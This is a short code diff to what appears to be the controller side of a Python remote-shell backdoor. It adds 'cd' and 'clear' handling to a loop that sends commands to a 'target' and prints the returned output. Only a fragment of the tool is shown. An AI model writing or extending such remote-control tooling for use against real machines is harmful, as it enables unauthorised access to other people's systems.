@@ -1,3 +1,4 @@
+import os
 import socket
 import json
 
@@ -23,6 +24,10 @@ def target_comunication():
         reliable_send(command)
         if command == 'quit':
             break
+        elif command[:3] == 'cd ':
+            pass
+        elif command == 'clear':
+            os.system(command)
         else:
             result = reliable_recv()
             print(result)
